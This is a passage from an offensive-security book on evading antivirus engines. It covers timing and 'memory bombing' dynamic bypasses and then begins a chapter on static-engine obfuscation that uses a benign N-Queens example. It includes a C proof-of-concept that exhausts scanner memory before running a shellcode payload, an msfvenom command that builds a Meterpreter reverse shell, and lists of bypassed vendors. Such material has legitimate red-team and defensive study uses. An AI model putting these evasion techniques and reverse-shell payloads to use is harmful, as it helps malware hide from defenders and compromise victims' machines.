• AVG
• Avira (No Cloud)
Antivirus bypass using timing-based techniques     89
• CrowdStrike Falcon
• Cybereason
• Cynet
• Fortinet
• F-Secure
• G-Data
• Malwarebytes
• McAfee
• Microsoft
• Palo Alto Networks
• Panda
• Sophos
• Symantec
• Trend Micro
During the research, for Proof-of-Concept (PoC) purposes, we used 
the Sleep() and GetTickCount() functions exclusively, but there 
are many other functions that can help malware to conduct timing-
based antivirus bypass (http://www.windowstimestamp.com/
MicrosecondResolutionTimeServicesForWindows.pdf). These include the 
following: 
• GetSystemTime
• GetSystemTimeAsFileTime 
• QueryPerformanceCounter
• Rdtsc
• timeGetTime 
• And more…
Let's learn about memory bombing. 
90     Bypassing the Dynamic Engine
Memory bombing – large memory allocation
Another way to take advantage of the limited time that antivirus software has to dedicate 
to each individual file during scanning is to perform a large memory allocation within the 
malware code. 
This causes the antivirus software to use excessive resources to check whether the file is 
malicious or benign. When antivirus uses excessive resources to perform a simple scan on 
a relatively large amount of memory, it forces the antivirus to back off from detecting our 
malicious file. We call this technique memory bombing.
Before we dive into a practical example of how to bypass the antivirus using this 
technique, we need to first understand the memory allocation mechanism, including 
what is actually happening in the memory while using the malloc() function, and the 
difference between malloc() and calloc(). We will also look at a practical Proof-of-
Concept that demonstrates the effectiveness of this technique.
What is malloc()?
malloc() is a function of the C language that is used, to some extent, in most 
mainstream operating systems such as Linux, macOS, and—of course—Windows.
When writing a C/C++ based program, we can declare the malloc() function to be a 
pointer, as follows: void *malloc(size);.
After execution of this function, it returns a value with a pointer to the allocated memory 
of the process's heap (or NULL if execution fails). 
It is important to note that is the programmer's responsibility to free the allocated 
memory from the process's heap using the free() function, as follows: free(*ptr);. 
The *ptr parameter of the free() function is the pointer to the previously allocated 
memory that was allocated with malloc().
From an attacker's standpoint, freeing the allocated memory space is crucial, mainly to 
wipe any data that could be used as an evidence for blue teams, digital forensics experts, 
and malware analysts.
Antivirus bypass using timing-based techniques     91
The following diagram illustrates how the malloc() function allocates a block of 
memory within a process's heap memory:
Figure 4.27 – Memory allocation using malloc()
Let's now understand the differences between—and uses of—malloc() and calloc(). 
calloc() versus malloc()
calloc() is another function that can be used to allocate memory in a process's heap. 
Unlike malloc(), which requests an allocation of memory but does not fill that memory 
with any data and leaves it uninitialized, calloc() initializes and fills all of the requested 
allocated memory with zero bits.
With this basic understanding of memory allocation, let's dive into the following practical 
example.
Here is a Proof-of-Concept example, written in C, of the memory-bombing technique:
int main()
{
    char *memory_bombing = NULL;
    memory_bombing = (char *) calloc(200000000, sizeof(char));
    if(memory_bombing != NULL)
    {
92     Bypassing the Dynamic Engine
        free(memory_bombing);
        payload();
    }
    return 0;
}
This code defines a main() function, which will ultimately execute the calloc() 
function with two parameters (the number of elements, and the overall size of the 
elements). Then, the if statement validates that the returned value is a valid pointer. At 
this point, after executing the calloc() function, the antivirus forfeits, and thus our 
code bypasses the antivirus. Next, we free the allocated memory by calling the free() 
function with a pointer to the allocated memory as a parameter, and finally run our 
malicious shellcode.
The following summary shows the flow of actions taking place within this code:
1. Define a main() function.
2. Declare a pointer variable named memory_bombing of type char with a NULL 
value.
3. Initialize the memory_bombing variable with the pointer of the returned value 
of the allocated memory of calloc(). At this point, the antivirus is struggling to 
scan the file, and forfeits.
4. For the sake of clean and elegant coding, check if the returned value of memory_
bombing is a valid pointer to our allocated memory.
5. Finally, free the allocated memory using the free() function and execute the 
intended malicious shellcode by calling our custom payload() function.
Now let's understand the logic behind this bypass technique.
The logic behind the technique
The logic behind this type of bypass technique relies on the dynamic antivirus engine 
scanning for malicious code in newly spawned processes by allocating virtual memory so 
that the executed process can be scanned for malicious code in a sandboxed environment. 
The allocated memory is limited because antivirus engines do not want to impact the user 
experience (UX). That is why, if we allocate a large amount of memory, antivirus engines 
will opt to retreat from the scan, thus paving the way for us to execute our malicious 
payload.
Antivirus bypass using timing-based techniques     93
Now, we can take this bypass technique and embed it in a simple C program that connects 
to a Meterpreter listener on a specific port. We used a simple Meterpreter shellcode, 
generated using the following command:
msfvenom -p windows/x64/Meterpreter/reverse_
tcp LHOST=192.168.1.10 LPORT=443 -f c
After embedding the code, we compiled it to a PE EXE file.
The following screenshot demonstrates the results of a VirusTotal scan before 
implementing the memory-bombing bypass technique: 
Figure 4.28 – 27/69 antivirus vendor detections before implementing memory-bombing technique
94     Bypassing the Dynamic Engine
And the following screenshot demonstrates the VirusTotal results after implementing the 
memory-bombing bypass technique:
Figure 4.29 – 17/68 antivirus vendor detections after implementing the memory-bombing technique
Important note
We specifically used a Meterpreter-based reverse shell to demonstrate how 
dangerous it is, and the fact that many antivirus engines do not detect it shows 
the power of this bypass technique.
Notice that this technique overcame more than 30 antivirus engines. Here is a list of major 
antivirus software that could be successfully bypassed solely by using this technique:
• Avast
• Bitdefender
• Comodo
Summary     95
• Check Point ZoneAlarm
• Cybereason
• Cyren
• Fortinet
• Kaspersky
• Malwarebytes
• McAfee
• Palo Alto Networks
• Panda
• Qihoo 360
• SentinelOne (Static ML)
• Sophos
• Symantec
• Trend Micro
Let's summarize the chapter.
Summary
In this chapter of the book, we started with preparing ourselves for antivirus bypass 
research, and you gleaned our main perspective about antivirus bypass—the use of 
platforms such as VirusTotal and other alternatives. Furthermore, you have learned about 
Windows API functions and their use in the Windows operating system, as well as about 
process address spaces and three different process-injection techniques.
Next, we introduced you to some accompanying knowledge, such as the common PE file 
types, the PE file structure, how to execute a DLL file, and why attackers use DLL files as 
an integral part of their attacks.
Also, we learned about timing-based attacks, using the Sleep() and GetTickCount() 
functions respectively to evade antivirus detections, and looked at why the Sleep() 
function is irrelevant in modern antivirus bypass techniques.
96     Bypassing the Dynamic Engine
Other than that, you learned about memory allocations and the differences between the 
malloc() and calloc() system call functions.
In the next chapter, you will learn how it is possible to bypass antivirus static engines. 
Further reading
• You can read more about keyloggers in our article, Dissecting Ardamax Keylogger: 
https://malwareanalysis.co/dissecting-ardamax-keylogger/
5
Bypassing the Static 
Engine
In this chapter, we will go into bypassing antivirus static detection engines in 
practical terms. We will learn the use of various obfuscation techniques that can be 
used to potentially bypass static antivirus engines. Furthermore, we will go through 
understanding the use of different encryption techniques such as oligomorphic-, 
polymorphic-, and metamorphic-based code that can be used to potentially bypass static 
antivirus engines. We will also show how packing and obfuscation techniques are used in 
malicious code to bypass most static engines in antivirus software.
In this chapter, we will explore the following topics:
• Antivirus bypass using obfuscation
• Antivirus bypass using encryption
• Antivirus bypass using packing 
98     Bypassing the Static Engine
Technical requirements
To follow along with the topics in the chapter, you will need the following:
• Previous experience in antivirus software
• Basic understanding of detecting malicious Portable Executable (PE) files
• Basic understanding of the C/C++ or Python programming languages
• Basic knowledge of the x86 assembly language 
• Nice to have: Experience using a debugger and disassemblers such as Interactive 
Disassembler Pro (IDA Pro) and x64dbg
Check out the following video to see the code in action: https://bit.ly/3iIDg7U
Antivirus bypass using obfuscation
Obfuscation is a simple technique of changing a form of code—such as source code and 
byte code—to make it less readable. For example, an Android Package Kit (APK) file can 
easily be decompiled to make it readable to Java code.
Here is an example of a decompilation process:
Figure 5.1 – Basic decompilation process
An app developer does not want unauthorized individuals to see their code, so the 
developer will use an obfuscation technique to protect the code and make it unreadable.
There are several obfuscation techniques. These are the two main techniques we have used 
in our research:
• Rename obfuscation
• Control-flow obfuscation
Let's look at both of these techniques in detail. 
Antivirus bypass using obfuscation     99
Rename obfuscation
With this technique, obfuscation is mainly performed on the variable names within the 
code. This technique makes it difficult to read and understand the code, as well as to 
understand the variable names and their context within the code itself.
After obfuscation, the variable name may be letters such as "A", "B", "C", and "D", 
numbers, unprintable characters, and more.
For example, we can use Oxyry Python Obfuscator (https://pyob.oxyry.com/) to 
perform rename obfuscation on this code to solve the eight queens problem.
Here is the readable code:
"""The n queens puzzle.
https://github.com/sol-prog/N-Queens-Puzzle/blob/master/
nqueens.py
"""
__all__ = []
class NQueens:
    """Generate all valid solutions for the n queens puzzle"""
    def __init__(self, size):
        # Store the puzzle (problem) size and the number of 
valid solutions
        self.__size = size
        self.__solutions = 0
        self.__solve()
    def __solve(self):
        """Solve the n queens puzzle and print the number of 
solutions"""
        positions = [-1] * self.__size
        self.__put_queen(positions, 0)
        print("Found", self.__solutions, "solutions.") 
    def __put_queen(self, positions, target_row):
        """
100     Bypassing the Static Engine
        Try to place a queen on target_row by checking all N 
possible cases.
        If a valid place is found the function calls itself 
trying to place a queen
        on the next row until all N queens are placed on the 
NxN board.
        """
        # Base (stop) case - all N rows are occupied
        if target_row == self.__size:
            self.__show_full_board(positions)
            self.__solutions += 1
        else:
            # For all N columns positions try to place a queen
            for column in range(self.__size):
                # Reject all invalid positions
                if self.__check_place(positions, target_row, 
column):
                    positions[target_row] = column
                    self.__put_queen(positions, target_row + 1)
    def __check_place(self, positions, ocuppied_rows, column):
        """
        Check if a given position is under attack from any of
        the previously placed queens (check column and diagonal 
positions)
        """
        for i in range(ocuppied_rows):
            if positions[i] == column or \
                positions[i] - i == column - ocuppied_rows or \
                positions[i] + i == column + ocuppied_rows:
                return False
        return True 
    def __show_full_board(self, positions):
        """Show the full NxN board"""
        for row in range(self.__size):
Antivirus bypass using obfuscation     101
            line = ""
            for column in range(self.__size):
                if positions[row] == column:
                    line += "Q "
                else:
                    line += ". "
            print(line)
        print("\n")
    def __show_short_board(self, positions):
        """
        Show the queens positions on the board in compressed 
form,
        each number represent the occupied column position in 
the corresponding row.
        """
        line = ""
        for i in range(self.__size):
            line += str(positions[i]) + " "
        print(line)
def main():
    """Initialize and solve the n queens puzzle"""
    NQueens(8)
if __name__ == "__main__":
    # execute only if run as a script
    main()
And here is the same code, which has exactly the same functionality, after performing 
rename obfuscation using Oxyry:
""#line:4
__all__ =[]#line:6 
class OO00OOOO0O0O00000 :#line:8
    ""#line:9
    def __init__ (O0OOO0000O0OO0000 ,O00OO0O00OO0OO0O0 
):#line:11
102     Bypassing the Static Engine
        O0OOO0000O0OO0000 .__OOOO0000O00OO00OO 
=O00OO0O00OO0OO0O0 #line:13
        O0OOO0000O0OO0000 .__OOOO0O00000O0O0O0 =0 #line:14
        O0OOO0000O0OO0000 .__O00OO0000O0000000 ()#line:15
    def __O00OO0000O0000000 (O0000OO0OO00000O0 ):#line:17
        ""#line:18
        O0000OOO0OOOO0000 =[-1 ]*O0000OO0OO00000O0 .__
OOOO0000O00OO00OO #line:19
        O0000OO0OO00000O0 .__O00O00O00000O0OOO 
(O0000OOO0OOOO0000 ,0 )#line:20
        print ("Found",O0000OO0OO00000O0 .__OOOO0O00000O0O0O0 
,"solutions.")#line:21
    def __O00O00O00000O0OOO (OOOOOOOOOO0O0O0OO 
,OOOOO0OOOO0000000 ,O00O0OOO0O0000O00 ):#line:23
        ""#line:28
        if O00O0OOO0O0000O00 ==OOOOOOOOOO0O0O0OO .__
OOOO0000O00OO00OO :#line:30
            OOOOOOOOOO0O0O0OO .__O0OOOOOOO0O000O0O 